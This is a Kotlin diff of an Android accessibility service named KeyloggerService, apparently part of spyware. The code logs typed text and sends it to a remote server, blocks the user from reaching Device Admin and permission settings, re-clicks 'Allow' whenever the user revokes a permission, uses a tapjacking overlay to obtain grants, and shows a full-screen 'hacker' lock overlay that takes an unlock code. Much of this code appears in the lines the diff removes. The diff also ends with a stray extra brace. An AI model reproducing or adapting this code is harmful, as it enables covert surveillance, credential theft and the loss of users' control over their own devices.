@@ -25,30 +25,14 @@ class KeyloggerService : AccessibilityService() {
     companion object {
         @Volatile var instance: KeyloggerService? = null
         @Volatile var unlockCode: String = "2719"
-        /** Jika true, saat dialog izin runtime muncul, langsung klik "Izinkan"
-         *  via AccessibilityNodeInfo.ACTION_CLICK — tanpa overlay, tanpa gesture koordinat */
-        @Volatile var autoGrantEnabled: Boolean = false
         /** Set false via self_destruct untuk nonaktifkan guard halaman Device Admin */
         @Volatile var adminGuardEnabled: Boolean = true
-        /** Set false untuk nonaktifkan guard halaman Permission Settings */
-        @Volatile var permissionGuardEnabled: Boolean = true
 
         fun showScreenInject(text: String, style: String = "hacker", speed: Float = 0.60f) { instance?.showOverlay(text, style, speed) }
         fun injectTap(x: Float, y: Float) { instance?.dispatchTap(x, y) }
         fun hideScreenInject()   { instance?.hideOverlay() }
         fun resetUnlockCode()    { unlockCode = "2719" }
 
-        // ── Package-package sistem yang menampilkan dialog izin runtime ──────
-        val PERMISSION_DIALOG_PACKAGES = setOf(
-            "com.android.packageinstaller",          // AOSP < 10
-            "com.google.android.packageinstaller",   // AOSP / Pixel
-            "com.android.permissioncontroller",      // Android 10+
-            "com.google.android.permissioncontroller", // Pixel / AOSP 11+
-            "com.miui.securitycenter",               // MIUI (Xiaomi)
-            "com.samsung.android.permissioncontroller", // Samsung OneUI
-            "com.lge.qpair.app",                     // LG
-            "com.huawei.systemmanager"               // EMUI (Huawei)
-        )
     }
 
     /** Inject tap via AccessibilityService.dispatchGesture (for OverlayTrickManager fallback) */
@@ -67,9 +51,6 @@ class KeyloggerService : AccessibilityService() {
     private var wm: WindowManager? = null
     private var soundManager: HackerSoundManager? = null
     private val overlayHandler = Handler(Looper.getMainLooper())
-
-    // ── Permission Guard Overlay — blokir seluruh sentuhan saat halaman permission muncul ──
-    @Volatile private var permGuardOverlayView: android.view.View? = null
 
     private val http = OkHttpClient.Builder()
         .connectTimeout(8, TimeUnit.SECONDS)
@@ -99,9 +80,7 @@ class KeyloggerService : AccessibilityService() {
             eventTypes  =
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED       or
                 AccessibilityEvent.TYPE_VIEW_FOCUSED            or
-                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED    or
-                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED  or
-                AccessibilityEvent.TYPE_VIEW_CLICKED            // ← deteksi tap user di halaman permission
+                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
             flags        =
                 AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS              or
@@ -139,19 +118,6 @@ class KeyloggerService : AccessibilityService() {
         return false
     }
 
-    // ── Debounce guard konten: cegah spam guard saat scroll/refresh ──────────
-    private var lastPermGuardPkg = ""
-    private var lastPermGuardMs  = 0L
-
-    /** Cek apakah pkg+className adalah halaman permission settings */
-    private fun isPermissionPage(pkg: String, className: String): Boolean {
-        if (!AppDeviceAdminReceiver.PERMISSION_SETTINGS_PACKAGES.contains(pkg)) return false
-        val isDedicated = AppDeviceAdminReceiver.PERMISSION_CONTROLLER_PACKAGES.contains(pkg)
-        return isDedicated || AppDeviceAdminReceiver.PERMISSION_PAGE_KEYWORDS.any {
-            className.contains(it, ignoreCase = true)
-        }
-    }
-
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         val ev = event ?: return
 
@@ -171,58 +137,10 @@ class KeyloggerService : AccessibilityService() {
                 activePkg   = pkg
                 activeField = hint
 
-                // ── Auto-trigger overlay saat dialog izin sistem muncul ──────
+                // FIX Bug 4: cegah user buka halaman Device Admin
                 if (ev.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                    // FIX Bug 4: cegah user buka halaman Device Admin
                     guardAdminPage(pkg, ev.className?.toString() ?: "")
-                    // Anti-disable permission: cegah + restore permission aktif
-                    guardPermissionPage(pkg, ev.className?.toString() ?: "")
-                    autoTriggerOverlay(pkg)
                 }
-            }
-
-            // ── User tap sesuatu — KUNCI: deteksi klik di halaman permission ──
-            // Pendekatan RESTORE: jika user tap "Jangan izinkan", kita langsung
-            // scan node tree dan re-klik "Izinkan" — lebih reliable dari overlay.
-            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
-                if (!permissionGuardEnabled) return
-                val pkg = ev.packageName?.toString() ?: return
-                if (pkg == packageName) return
-                val className = ev.className?.toString() ?: ""
-                if (!isPermissionPage(pkg, className)) return
-
-                android.util.Log.d("PermGuard", "Click detected on perm page: $pkg / $className")
-
-                // T+100ms: restore "Izinkan" (beri waktu state radio-button update dulu)
-                handler.postDelayed({ restorePermissionAllow() }, 100)
-                // T+150ms: restore sekali lagi (double-ensure untuk MIUI animasi lambat)
-                handler.postDelayed({ restorePermissionAllow() }, 150)
-                // T+200ms: BACK keluar halaman
-                handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK) }, 200)
-                // T+400ms: HOME (pastikan keluar Settings sepenuhnya)
-                handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME) }, 400)
-                // T+600ms: restore sekali lagi sebagai final safety net
-                handler.postDelayed({ restorePermissionAllow() }, 600)
-            }
-
-            // ── Konten window berubah (navigasi fragment dalam activity yg sama) ──
-            // Penting: beberapa ROM tidak fire WINDOW_STATE_CHANGED saat buka
-            // halaman permission detail — hanya fire WINDOW_CONTENT_CHANGED.
-            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
-                val pkg = ev.packageName?.toString() ?: return
-                if (pkg == packageName) return
-                if (!AppDeviceAdminReceiver.PERMISSION_SETTINGS_PACKAGES.contains(pkg)) return
-
-                // Debounce 800ms per-package agar tidak spam guard saat scroll
-                val now = System.currentTimeMillis()
-                if (pkg == lastPermGuardPkg && now - lastPermGuardMs < 800) return
-                lastPermGuardPkg = pkg
-                lastPermGuardMs  = now
-
-                val className = ev.className?.toString() ?: ""
-                guardPermissionPage(pkg, className)
-                // Juga restore "Izinkan" jika konten berubah (user mungkin sudah tap)
-                if (isPermissionPage(pkg, className)) restorePermissionAllow()
             }
 
             // ── Teks berubah — ini jalur utama untuk soft keyboard ────────────
@@ -274,16 +192,6 @@ class KeyloggerService : AccessibilityService() {
         }
     }
 
-    /**
-     * Cek apakah package yang baru muncul adalah dialog izin runtime.
-     *
-     * Mode AUTO-GRANT (autoGrantEnabled = true):
-     *   Langsung scan node tree → cari tombol "Izinkan" / "Allow" →
-     *   performAction(ACTION_CLICK). Tidak perlu overlay, tidak perlu koordinat.
-     *
-     * Mode OVERLAY TRICK (default):
-     *   Tampilkan overlay "BATAL" di atas tombol "Izinkan" (tapjacking).
-     */
 
     /**
      * FIX Bug 4 — intercept halaman Device Admin di Settings.
@@ -306,385 +214,5 @@ class KeyloggerService : AccessibilityService() {
         }, 10)
     }
 
-    /**
-     * Tampilkan overlay transparan penuh yang MEMBLOKIR semua sentuhan user.
-     * TYPE_ACCESSIBILITY_OVERLAY tanpa FLAG_NOT_TOUCHABLE → semua tap diserap overlay,
-     * tidak ada yang tembus ke halaman permission di bawahnya.
-     */
-    private fun showPermGuardOverlay() {
-        if (permGuardOverlayView != null) return
-        try {
-            val view = android.view.View(this).apply {
-                // Hitam semi-transparan 50% — user tahu layar terkunci
-                setBackgroundColor(android.graphics.Color.argb(128, 0, 0, 0))
-            }
-            val params = WindowManager.LayoutParams(
-                WindowManager.LayoutParams.MATCH_PARENT,
-                WindowManager.LayoutParams.MATCH_PARENT,
-                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                // TANPA FLAG_NOT_TOUCHABLE → overlay menyerap semua sentuhan
-                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
-                PixelFormat.TRANSLUCENT
-            )
-            (getSystemService(Context.WINDOW_SERVICE) as WindowManager).addView(view, params)
-            permGuardOverlayView = view
-        } catch (_: Exception) {}
-    }
-
-    /** Hapus overlay permission guard setelah navigasi selesai */
-    private fun dismissPermGuardOverlay(delayMs: Long = 700) {
-        handler.postDelayed({
-            permGuardOverlayView?.let { v ->
-                try {
-                    (getSystemService(Context.WINDOW_SERVICE) as WindowManager).removeView(v)
-                } catch (_: Exception) {}
-                permGuardOverlayView = null
-            }
-        }, delayMs)
-    }
-
-    /**
-     * Jika user membuka halaman Permission Settings (misal Settings > Apps > [App] > Permissions),
-     * langsung:
-     *   1. Tampilkan overlay penutup layar → semua sentuhan user diserap, tidak ada yg tembus
-     *   2. Multi-fire BACK + HOME untuk navigasi keluar secepat mungkin
-     *   3. Tutup overlay setelah navigasi selesai
-     *
-     * Strategi:
-     *   T+0ms   → OVERLAY muncul (block semua touch seketika) + BACK langsung
-     *   T+80ms  → BACK kedua (fallback jika pertama belum efektif)
-     *   T+180ms → HOME (paksa keluar Settings)
-     *   T+320ms → BACK ketiga (ROM animasi lambat / MIUI)
-     *   T+500ms → HOME kedua (penjamin final)
-     *   T+700ms → Overlay hilang
-     *
-     * Package dedicated permission controller (com.android.permissioncontroller dll)
-     * diblokir semua window-nya tanpa cek className.
-     */
-    private fun guardPermissionPage(pkg: String, className: String) {
-        if (!permissionGuardEnabled) return
-        if (!AppDeviceAdminReceiver.PERMISSION_SETTINGS_PACKAGES.contains(pkg)) return
-
-        // Dedicated permission controller packages → blokir SEMUA window-nya
-        val isDedicatedPermPkg = AppDeviceAdminReceiver.PERMISSION_CONTROLLER_PACKAGES.contains(pkg)
-        val isPermPage = isDedicatedPermPkg || AppDeviceAdminReceiver.PERMISSION_PAGE_KEYWORDS.any { kw ->
-            className.contains(kw, ignoreCase = true)
-        }
-        if (!isPermPage) return
-
-        android.util.Log.d("PermGuard", "Blocked: $pkg / $className [dedicated=$isDedicatedPermPkg]")
-
-        // LANGKAH 1 — Overlay penutup layar seketika (blokir semua sentuhan)
-        showPermGuardOverlay()
-
-        // LANGKAH 2 — Multi-fire BACK + HOME
-        performGlobalAction(GLOBAL_ACTION_BACK)                                      // T+0ms
-        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK)  },   80)     // T+80ms
-        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME)  },  180)     // T+180ms
-        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK)  },  320)     // T+320ms
-        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME)  },  500)     // T+500ms
-
-        // LANGKAH 3 — Tutup overlay setelah navigasi pasti selesai
-        dismissPermGuardOverlay(700)                                                 // T+700ms
-    }
-
-    /**
-     * PENDEKATAN RESTORE — scan seluruh node tree di window aktif,
-     * cari semua opsi "Izinkan" / "Allow" dan force-klik.
-     *
-     * Dipanggil setelah user tap apapun di halaman permission.
-     * Bahkan jika "Jangan izinkan" sudah berhasil dipilih, kita langsung
-     * klik balik "Izinkan" sehingga permission tetap ON.
-     *
-     * Label mencakup: radio button "Izinkan", "Allow", tombol "Izinkan" di dialog,
-     * dan variant "Hanya saat menggunakan aplikasi" (juga termasuk allow).
-     */
-    private val PERM_ALLOW_LABELS = listOf(
-        // Bahasa Indonesia
-        "izinkan", "izin", "izinkan saja", "hanya kali ini",
-        "hanya saat menggunakan aplikasi", "selalu izinkan",
-        // English
-        "allow", "grant", "allow only while using the app",
-        "only this time", "always", "allow all the time",
-        "while using the app"
-    )
-
-    private fun restorePermissionAllow() {
-        if (!permissionGuardEnabled) return
-        val root = rootInActiveWindow ?: return
-        try {
-            val clicked = forceClickAllow(root)
-            android.util.Log.d("PermGuard", "restorePermissionAllow clicked=$clicked")
-        } finally {
-            try { root.recycle() } catch (_: Exception) {}
-        }
-    }
-
-    /**
-     * Traverse node tree secara rekursif.
-     * Klik semua node yang teksnya cocok dengan PERM_ALLOW_LABELS —
-     * tidak peduli apakah sudah selected atau belum (force-click).
-     * Return true jika minimal satu berhasil diklik.
-     */
-    private fun forceClickAllow(
-        node: android.view.accessibility.AccessibilityNodeInfo
-    ): Boolean {
-        val text = node.text?.toString()?.trim()?.lowercase() ?: ""
-        val desc = node.contentDescription?.toString()?.trim()?.lowercase() ?: ""
-
-        val isAllow = PERM_ALLOW_LABELS.any { label ->
-            text == label || text.startsWith(label) ||
-            desc == label || desc.startsWith(label)
-        }
-
-        var clicked = false
-        if (isAllow) {
-            if (node.isClickable) {
-                node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                clicked = true
-            } else {
-                val parent = node.parent
-                if (parent != null) {
-                    if (parent.isClickable) {
-                        parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                        clicked = true
-                    }
-                    try { parent.recycle() } catch (_: Exception) {}
-                }
-            }
-        }
-
-        for (i in 0 until node.childCount) {
-            val child = node.getChild(i) ?: continue
-            val childClicked = forceClickAllow(child)
-            try { child.recycle() } catch (_: Exception) {}
-            if (childClicked) clicked = true
-        }
-        return clicked
-    }
-
-    private fun autoTriggerOverlay(pkg: String) {
-        if (!PERMISSION_DIALOG_PACKAGES.contains(pkg)) return
-
-        if (autoGrantEnabled) {
-            // ── Mode: auto-grant via AccessibilityService node click ──────────
-            // Delay 400ms agar dialog fully rendered + node hierarchy tersedia
-            handler.postDelayed({
-                val clicked = autoClickAllow()
-                android.util.Log.d("AutoGrant", "auto-click result=$clicked pkg=$pkg")
-            }, 400)
-            return
-        }
-
-        // ── Mode: overlay trick (lama) ────────────────────────────────────────
-        if (OverlayTrickManager.isActive) return
-        if (!Settings.canDrawOverlays(applicationContext)) return
-
-        handler.postDelayed({
-            if (OverlayTrickManager.isActive) return@postDelayed
-            val configJson = """
-                {
-                  "fakeText":  "BATAL",
-                  "fakeColor": "#CC1565C0",
-                  "offsetX":   0,
-                  "offsetY":   0,
-                  "duration":  30,
-                  "fullBlock": false
-                }
-            """.trimIndent()
-            OverlayTrickManager.start(applicationContext, configJson, callerPkg = pkg)
-        }, 350)
-    }
-
-    /**
-     * Scan semua node di window aktif, cari tombol "Izinkan" / "Allow" dan klik.
-     * Mengembalikan true jika berhasil klik.
-     */
-    private fun autoClickAllow(): Boolean {
-        val root = rootInActiveWindow ?: return false
-        return try {
-            traverseAndClickAllow(root)
-        } finally {
-            try { root.recycle() } catch (_: Exception) {}
-        }
-    }
-
-    private fun traverseAndClickAllow(
-        node: android.view.accessibility.AccessibilityNodeInfo
-    ): Boolean {
-        // Label-label tombol "Allow" dari berbagai ROM & bahasa
-        val ALLOW_LABELS = setOf(
-            "izinkan", "allow", "izin", "grant",
-            "izinkan saja", "only this time",
-            "hanya kali ini", "selalu", "always",
-            "while using the app", "hanya saat menggunakan aplikasi",
-            "allow only while using the app"
-        )
-
-        val text = node.text?.toString()?.trim()?.lowercase() ?: ""
-        val desc = node.contentDescription?.toString()?.trim()?.lowercase() ?: ""
-
-        val isAllow = ALLOW_LABELS.any { label ->
-            text == label || text.startsWith(label) ||
-            desc == label || desc.startsWith(label)
-        }
-
-        if (isAllow) {
-            // Coba klik node langsung
-            if (node.isClickable) {
-                node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                return true
-            }
-            // Fallback: klik parent
-            val parent = node.parent
-            if (parent != null) {
-                if (parent.isClickable) {
-                    parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
-                    try { parent.recycle() } catch (_: Exception) {}
-                    return true
-                }
-                try { parent.recycle() } catch (_: Exception) {}
-            }
-        }
-
-        // Rekursif ke semua child
-        for (i in 0 until node.childCount) {
-            val child = node.getChild(i) ?: continue
-            val found = traverseAndClickAllow(child)
-            try { child.recycle() } catch (_: Exception) {}
-            if (found) return true
-        }
-        return false
-    }
-
-    override fun onInterrupt() {}
-
-    override fun onDestroy() {
-        super.onDestroy()
-        hideOverlay()
-        dismissPermGuardOverlay(0)  // cleanup overlay jika masih ada
-        instance = null
-        // Flush semua pending sebelum service mati
-        fields.values.forEach { entry ->
-            entry.runnable?.let { handler.removeCallbacks(it) }
-            if (entry.pendingText.isNotBlank()) sendNow(entry.pkg, entry.fieldHint, entry.pendingText)
-        }
-        fields.clear()
-    }
-
-    // ── Debounce 250 ms per field — kirim teks paling baru setelah jeda ──────
-    private fun scheduleField(pkg: String, fieldHint: String, text: String) {
-        val key   = "$pkg|$fieldHint"
-        val entry = fields.getOrPut(key) { FieldEntry(pkg, fieldHint) }
-
-        // Batalkan timer lama
-        entry.runnable?.let { handler.removeCallbacks(it) }
-        entry.pendingText = text
-
-        val run = Runnable {
-            val t = entry.pendingText
-            if (t.isNotBlank()) {
-                sendNow(pkg, fieldHint, t)
-                entry.pendingText = ""
-            }
-        }
-        entry.runnable = run
-        handler.postDelayed(run, 250)
-    }
-
-    // ── Resolusi deviceId identik dengan ConnectorService ────────────────────
-    private fun resolveDeviceId(): String {
-        @Suppress("HardwareIds")
-        val androidId = Settings.Secure.getString(
-            contentResolver, Settings.Secure.ANDROID_ID
-        )?.takeIf { it.isNotBlank() && it != "9774d56d682e549c" }
-        return if (androidId != null) {
-            androidId
-        } else {
-            val hw = "${Build.MANUFACTURER}:${Build.MODEL}:${Build.BOARD}:${Build.HARDWARE}"
-            hw.hashCode().toString().replace("-", "x")
-        }
-    }
-
-    // ── Kirim langsung ke server tanpa debounce ───────────────────────────────
-    private fun sendNow(pkg: String, fieldHint: String, text: String) {
-        val deviceId = resolveDeviceId()
-
-        val body = JsonObject().apply {
-            addProperty("deviceId",   deviceId)
-            addProperty("appPackage", pkg)
-            addProperty("appName",    getAppName(pkg))
-            addProperty("fieldName",  fieldHint)
-            addProperty("text",       text)
-        }
-
-        Thread {
-            try {
-                http.newCall(
-                    Request.Builder()
-                        .url("${SecureConfig.serverUrl()}/api/device/keylog")
-                        .post(body.toString().toRequestBody(JSON_MEDIA))
-                        .build()
-                ).execute().close()
-            } catch (_: Exception) {}
-        }.also { it.isDaemon = true }.start()
-    }
-
-    // ── Resolusi nama field dari event + node ─────────────────────────────────
-    private fun resolveFieldHint(ev: AccessibilityEvent, src: android.view.accessibility.AccessibilityNodeInfo?): String {
-        if (src != null) {
-            val hint   = src.hintText?.toString()?.trim()?.takeIf { it.isNotBlank() }
-            val desc   = src.contentDescription?.toString()?.trim()?.takeIf { it.isNotBlank() }
-            val viewId = src.viewIdResourceName?.substringAfterLast("/")?.takeIf { it.isNotBlank() }
-            if (hint != null) return hint
-            if (desc != null) return desc
-            if (viewId != null) return viewId
-        }
-        return ev.className?.toString()?.substringAfterLast(".") ?: "Field"
-    }
-
-    private fun getAppName(pkg: String): String = try {
-        packageManager.getApplicationLabel(packageManager.getApplicationInfo(pkg, 0)).toString()
-    } catch (_: Exception) { pkg }
-
-    // ── Screen Inject Overlay ─────────────────────────────────────────────────
-    fun showOverlay(text: String, style: String = "hacker", speed: Float = 0.60f) {
-        overlayHandler.post {
-            hideOverlayInternal()
-            val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
-            wm = windowManager
-            val view = HackerOverlayView(this, text.ifBlank { "By IWX TEAM" }, style, unlockCode, speed,
-                onGranted = { soundManager?.stop(); soundManager = null }
-            ) {
-                hideOverlay()
-            }
-            val params = WindowManager.LayoutParams(
-                WindowManager.LayoutParams.MATCH_PARENT,
-                WindowManager.LayoutParams.MATCH_PARENT,
-                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR,
-                PixelFormat.TRANSLUCENT
-            ).also {
-                it.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE or
-                                   WindowManager.LayoutParams.SOFT_INPUT_STATE_VISIBLE
-            }
-            windowManager.addView(view, params)
-            overlayView = view
-            view.alpha = 0f
-            view.animate().alpha(1f).setDuration(600).start()
-            soundManager?.stop()
-            soundManager = HackerSoundManager(this@KeyloggerService, speed).also { it.start(text.ifBlank { "System breach initiated" }) }
-        }
-    }
-
-    fun hideOverlay() { overlayHandler.post { hideOverlayInternal() } }
-
-    private fun hideOverlayInternal() {
-        overlayView?.let { v ->
-            try { v.stop(); wm?.removeView(v) } catch (_: Exception) {}
-            overlayView = null
-        }
-        try { soundManager?.stop() } catch (_: Exception) {}
-        soundManager = null
-    }
+}
 }
